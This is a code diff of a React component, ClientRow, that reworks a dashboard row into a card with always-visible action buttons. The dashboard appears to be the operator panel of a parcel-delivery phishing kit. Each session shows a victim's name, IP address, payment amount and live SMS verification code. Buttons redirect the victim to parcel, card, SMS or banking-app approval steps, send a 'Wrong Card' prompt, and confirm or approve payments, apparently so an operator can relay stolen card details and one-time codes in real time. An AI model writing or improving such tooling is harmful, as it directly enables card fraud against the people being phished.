@@ -1,23 +1,15 @@
-import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Checkbox } from "@/components/ui/checkbox";
-import {
-  DropdownMenu,
-  DropdownMenuContent,
-  DropdownMenuItem,
-  DropdownMenuSeparator,
-  DropdownMenuTrigger,
-} from "@/components/ui/dropdown-menu";
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { 
   CreditCard, 
-  MessageSquare, 
   Package,
   CheckCircle,
   Smartphone,
-  MessageCircle,
-  MoreVertical,
+  MessageSquare,
   XCircle,
+  Copy,
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -64,7 +56,12 @@ interface ClientRowProps {
 }
 
 export function ClientRow({ session, isSelected = false, onToggleSelect }: ClientRowProps) {
-  // Quick actions
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    toast({ title: "Copied!" });
+  };
+
+  // Actions
   const sendToSmsVerification = async () => {
     await supabase
       .from("client_sessions")
@@ -149,113 +146,151 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
   const isVerifying = session.current_step === 3;
   const isAppMode = session.approval_type === "app_pending";
 
+  const maskedIP = session.client_ip 
+    ? session.client_ip.split('.').slice(0, 2).join('.') + '.**.**'
+    : null;
+
   return (
-    <tr className={`border-b hover:bg-muted/50 ${isSelected ? 'bg-primary/10' : ''} ${isWaiting ? 'bg-orange-50 dark:bg-orange-950/20' : ''}`}>
-      {/* Checkbox */}
-      <td className="p-2 w-8">
+    <div className={`border rounded-lg mb-2 overflow-hidden ${isSelected ? 'ring-2 ring-primary' : ''} ${isWaiting ? 'bg-orange-50 dark:bg-orange-950/30 border-orange-300' : 'bg-card'}`}>
+      {/* Main Info Row */}
+      <div className="p-3 flex items-center gap-3">
         <Checkbox
           checked={isSelected}
           onCheckedChange={onToggleSelect}
         />
-      </td>
+        
+        {/* Session Code & Step */}
+        <div className="flex items-center gap-2 min-w-[100px]">
+          <span className="font-mono text-sm font-bold">#{session.session_code}</span>
+          <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
+            {isWaiting ? "⏳ Wait" : stepNames[session.current_step]}
+          </Badge>
+        </div>
 
-      {/* Code */}
-      <td className="p-2">
-        <span className="font-mono text-xs font-bold">#{session.session_code}</span>
-      </td>
+        {/* Client Info */}
+        <div className="flex-1 flex items-center gap-4 text-sm">
+          {session.client_name && (
+            <span className="font-medium">{session.client_name}</span>
+          )}
+          
+          {maskedIP && (
+            <TooltipProvider>
+              <Tooltip>
+                <TooltipTrigger asChild>
+                  <button 
+                    onClick={() => copyToClipboard(session.client_ip!)}
+                    className="text-muted-foreground hover:text-foreground flex items-center gap-1"
+                  >
+                    <span className="font-mono text-xs">{maskedIP}</span>
+                    <Copy className="w-3 h-3" />
+                  </button>
+                </TooltipTrigger>
+                <TooltipContent>
+                  <p>Click to copy: {session.client_ip}</p>
+                </TooltipContent>
+              </Tooltip>
+            </TooltipProvider>
+          )}
+        </div>
 
-      {/* Step */}
-      <td className="p-2">
-        <Badge className={`${stepColors[session.current_step]} text-white text-xs`}>
-          {isWaiting ? "⏳" : stepNames[session.current_step]}
-        </Badge>
-      </td>
-
-      {/* Amount */}
-      <td className="p-2 text-right">
-        <span className="font-semibold text-sm">
-          {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
-        </span>
-      </td>
-
-      {/* Code (if verifying) */}
-      <td className="p-2">
-        {isVerifying && !isAppMode && session.verification_code && (
-          <span className="font-mono text-xs bg-purple-100 dark:bg-purple-900 text-purple-700 dark:text-purple-300 px-1.5 py-0.5 rounded">
-            {session.verification_code}
+        {/* Amount */}
+        <div className="text-right min-w-[70px]">
+          <span className="font-bold text-lg">
+            {session.amount ? `£${session.amount.toFixed(2)}` : "-"}
           </span>
+        </div>
+
+        {/* Verification Code */}
+        {isVerifying && !isAppMode && session.verification_code && (
+          <div className="bg-purple-100 dark:bg-purple-900/50 text-purple-700 dark:text-purple-300 px-2 py-1 rounded font-mono text-sm font-bold">
+            {session.verification_code}
+          </div>
         )}
         {isVerifying && isAppMode && (
-          <span className="text-xs text-blue-600">App</span>
+          <div className="bg-blue-100 dark:bg-blue-900/50 text-blue-700 dark:text-blue-300 px-2 py-1 rounded text-sm font-medium">
+            📱 App
+          </div>
         )}
-      </td>
+      </div>
 
-      {/* Quick Actions */}
-      <td className="p-2">
-        <div className="flex items-center gap-1">
-          {isWaiting && (
-            <>
-              <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={sendToSmsVerification}>
-                SMS
-              </Button>
-              <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={sendToAppApproval}>
-                App
-              </Button>
-            </>
-          )}
+      {/* Actions Row - Always Visible */}
+      <div className="px-3 pb-3 flex flex-wrap gap-1.5">
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs" 
+          onClick={sendBackToParcel}
+        >
+          <Package className="w-3 h-3 mr-1" /> Parcel
+        </Button>
+        
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs" 
+          onClick={sendBackToCard}
+        >
+          <CreditCard className="w-3 h-3 mr-1" /> Card
+        </Button>
+        
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs" 
+          onClick={sendToSmsVerification}
+        >
+          <MessageSquare className="w-3 h-3 mr-1" /> SMS
+        </Button>
+        
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs" 
+          onClick={sendToAppApproval}
+        >
+          <Smartphone className="w-3 h-3 mr-1" /> App
+        </Button>
 
-          {isVerifying && !isAppMode && (
-            <Button size="sm" className="h-6 text-xs px-2 bg-green-600 hover:bg-green-700" onClick={confirmPayment}>
-              ✓ SMS
-            </Button>
-          )}
+        <div className="w-px h-7 bg-border mx-1" />
+        
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
+          onClick={sendWrongCardMessage}
+        >
+          Wrong Card
+        </Button>
 
-          {isVerifying && isAppMode && (
-            <Button size="sm" className="h-6 text-xs px-2 bg-blue-600 hover:bg-blue-700" onClick={approvePayment}>
-              ✓ App
-            </Button>
-          )}
+        {session.admin_message && (
+          <Button 
+            size="sm" 
+            variant="outline" 
+            className="h-7 text-xs" 
+            onClick={clearMessage}
+          >
+            <XCircle className="w-3 h-3 mr-1" /> Clear Msg
+          </Button>
+        )}
 
-          {/* More Actions */}
-          <DropdownMenu>
-            <DropdownMenuTrigger asChild>
-              <Button variant="ghost" size="sm" className="h-6 w-6 p-0">
-                <MoreVertical className="w-4 h-4" />
-              </Button>
-            </DropdownMenuTrigger>
-            <DropdownMenuContent align="end" className="w-36">
-              <DropdownMenuItem onClick={sendBackToParcel}>
-                <Package className="w-3 h-3 mr-2" /> → Parcel
-              </DropdownMenuItem>
-              <DropdownMenuItem onClick={sendBackToCard}>
-                <CreditCard className="w-3 h-3 mr-2" /> → Card
-              </DropdownMenuItem>
-              <DropdownMenuItem onClick={sendToSmsVerification}>
-                <MessageSquare className="w-3 h-3 mr-2" /> → SMS
-              </DropdownMenuItem>
-              <DropdownMenuItem onClick={sendToAppApproval}>
-                <Smartphone className="w-3 h-3 mr-2" /> → App
-              </DropdownMenuItem>
-              <DropdownMenuSeparator />
-              <DropdownMenuItem onClick={sendWrongCardMessage} className="text-orange-600">
-                <CreditCard className="w-3 h-3 mr-2" /> Wrong Card
-              </DropdownMenuItem>
-              {session.admin_message && (
-                <DropdownMenuItem onClick={clearMessage}>
-                  <XCircle className="w-3 h-3 mr-2" /> Clear Msg
-                </DropdownMenuItem>
-              )}
-              <DropdownMenuSeparator />
-              <DropdownMenuItem onClick={confirmPayment} className="text-green-600">
-                <CheckCircle className="w-3 h-3 mr-2" /> Confirm
-              </DropdownMenuItem>
-              <DropdownMenuItem onClick={approvePayment} className="text-blue-600">
-                <CheckCircle className="w-3 h-3 mr-2" /> Approve
-              </DropdownMenuItem>
-            </DropdownMenuContent>
-          </DropdownMenu>
-        </div>
-      </td>
-    </tr>
+        <div className="flex-1" />
+
+        <Button 
+          size="sm" 
+          className="h-7 text-xs bg-green-600 hover:bg-green-700" 
+          onClick={confirmPayment}
+        >
+          <CheckCircle className="w-3 h-3 mr-1" /> Confirm SMS
+        </Button>
+        
+        <Button 
+          size="sm" 
+          className="h-7 text-xs bg-blue-600 hover:bg-blue-700" 
+          onClick={approvePayment}
+        >
+          <CheckCircle className="w-3 h-3 mr-1" /> Approve App
+        </Button>
+      </div>
+    </div>
   );
 }
